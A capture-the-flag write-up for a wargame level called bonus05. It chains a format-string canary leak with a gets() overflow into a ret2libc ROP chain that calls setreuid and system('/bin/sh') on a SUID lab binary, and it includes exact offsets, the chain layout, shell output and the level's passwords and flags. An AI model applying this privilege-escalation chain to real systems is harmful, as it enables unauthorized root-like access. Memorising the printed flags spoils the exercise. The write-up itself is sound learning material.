# bonus05 — "Environ" — Format-String Canary Leak → `gets()` Overflow → ret2libc (FINAL LEVEL)

## Concept

`./environ`, SUID owned by `flagbonus05`, home dir `/home/bonus05/`.
The fifth and final bonus level — confirmed there is no `bonus06`
(an `ssh bonus06@...` attempt with this level's flag fails outright,
consistent with the subject defining exactly 5 bonus levels).
Structurally the closest of any bonus level to the mandatory canary
playbook (levels 06-10): a format-string canary leak in one function,
an unbounded `gets()` overflow in a different function, ret2libc. Full
mitigation set per `checksec` (Full RELRO, canary, NX, PIE), and the
binary explicitly leaks both `environ`'s value (a stack address) and
its own PIE-relative `vault` global on every run — neither of which
turned out to be necessary for the final exploit, since ASLR is off
VM-wide and the same fixed libc base used throughout this whole project
is enough on its own.

## Recon

Login: `ssh bonus05@127.0.0.1 -p 4244`, password = bonus04's flag
(`d2wlrk7cuuruus7iwfayjdjaiwagj7dl`).

No source provided. `ls -la ~`: SUID binary `environ`, owned by
`flagbonus05`, same pwndbg `.gdbinit` as the other bonus levels.

`getent passwd flagbonus05` → uid 1032.

`checksec ./environ` (on the VM):
```
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
Back to the full mitigation set (canary + PIE both present, unlike
bonus04). CET still inert on this VM (established in bonus02, VM-wide
property, not re-checked per-binary).

`nm ./environ`: `init_vault`, `store_var`, `lookup`, `trace_query`,
`info_leak`, `handle_input`, `print_banner`, `main`. `objdump -T`:
`getenv` is imported (new) alongside the usual `gets`/`fgets`/`printf`/
`strncmp`/`strncpy`/`puts`/`__stack_chk_fail` — no `setreuid`/
`geteuid`/`system`, same absence pattern as bonus03/bonus04.

### Disassembling `main`

```c
int main() {
    init_vault();     // seeds a small vault[] table from getenv("PATH"/"HOME"/"TERM")
    print_banner();
    trace_query();      // called ONCE
    handle_input();       // called ONCE
}
```
No loop, no command dispatcher wrapping repeated calls — each stage
runs exactly once, automatically, in a fixed order. This means the
exploit is just two sequential lines of input to a single process
invocation, not a repeated command-loop interaction like bonus03.

`init_vault()`/`store_var()`/`lookup()` were disassembled and confirmed
to just implement a small (8-slot) key-value table seeded from
environment variables (`PATH`, `HOME`, `TERM`, with hardcoded fallback
values if unset) — a thematic red herring like bonus04's hash table,
not part of the actual exploit path.

### `trace_query()` — the leak

```c
void trace_query(void) {
    char buf[80];                        // rbp-0x50
    printf("[ENVIRON] Trace tag: "); fflush(stdout);
    if (!fgets(buf, 0x40, stdin)) return;    // BOUNDED (64 of 80 bytes) -- no overflow here
    printf("[ENVIRON] Resolving ");
    printf(buf);                              // format-string bug: buf is fully attacker-controlled
    fflush(stdout);
}
```

### `handle_input()` — the overflow

```c
void handle_input(void) {
    info_leak();                          // ALWAYS fires: prints environ@ and vault@ addresses
    printf("[ENVIRON] Query: "); fflush(stdout);
    char buf[96];                           // rbp-0x60
    gets(buf);                               // UNBOUNDED -- the actual bug
    if (!strncmp(buf, "GET:", 4)) lookup(buf+4);
    else if (!strncmp(buf, "LIST", 4)) { ...iterate vault[]... }
    else puts("[ENVIRON] Unknown command.");
}
```
`info_leak()` prints (via `%p`) the process's own `environ` global
(a pointer into the stack, near `envp`) and the PIE-relative `vault`
array's address, every single time `handle_input()` runs — a free leak
pair, similar in spirit to level09's free `puts@libc` leak or bonus01's
free `disconnect@binary` leak. Confirmed live but not actually used in
the final exploit: no PIE-relative or stack-relative address is needed
for a plain `system()`/`setreuid()` ret2libc chain when the libc base
is already known and fixed VM-wide.

## Retrieving the addresses, command by command

Canary leak index for `trace_query()`'s `printf(buf)`: same
precise-index method as bonus03 — a breakpoint at the literal `call
printf` instruction in `trace_query`, reading `$rsp`/`$rbp` directly:
```
break *trace_query+0x7b
RSP = 0x7fffffffd760, RBP = 0x7fffffffd7b0
canary @ RBP-8 = 0x7fffffffd7a8
(canary_addr - RSP)/8 = 9  ->  positional index = 6 + 9 = 15
```
Verified against the real target: `%15$p` reliably prints a value
ending in `0x00`.

Overflow offset in `handle_input()`: `buf` at `rbp-0x60`, canary at
`rbp-8` → offset = `0x58` (88) bytes, then 8 junk bytes for the
(unused, plain-overflow, no pivot) saved rbp slot, then the ROP chain.

`objdump -T` showed no `setreuid`/`geteuid` imports here either — the
third time seeing this absence, after bonus03 and bonus04 — so, same
as bonus04, the `setreuid(flagbonus05_uid, flagbonus05_uid)` ROP step
(uid `1032` from `getent passwd flagbonus05`) was included from the
first attempt rather than rediscovering the `dash` privilege-drop
(see bonus03) the hard way a third time. `id` in the resulting shell
on the first live run confirmed `uid=1032(flagbonus05)`.

Alignment fixup: swept `n_extra_ret` in `{0,1,2,3}` directly against
the real SUID target. `n_extra_ret = 1` worked — the same value as
level10, bonus03, and bonus04, the most common alignment count across
the entire project.

## Exploit

Two sequential lines of input to one process invocation (no repeated
command loop needed, unlike bonus03):

```
"CANARY=%15$p"                          <- answers trace_query()'s prompt, leaks canary
<handle_input's info_leak() fires automatically, printed but unused>
88 bytes junk + canary + 8 junk
+ pop rdi;ret -> 1032
+ pop rsi;pop rbp;ret -> 1032, 0
+ setreuid
+ pop rdi;ret -> "/bin/sh"
+ ret (1 alignment fixup)
+ system                                 <- answers handle_input()'s gets() prompt
```

```
$ python3 exploit.py
[+] leaked canary: 0xc4cb9ec87334aa00
uid=1032(flagbonus05) gid=1018(bonus05) groups=1018(bonus05),1001(levelgroup)
nvazef2rudbey6zmn8pe6kqzpjufcigw
```

Confirmed this is the last level: `ssh bonus06@127.0.0.1 -p 4244` with
this flag as the password fails outright — no such level exists.

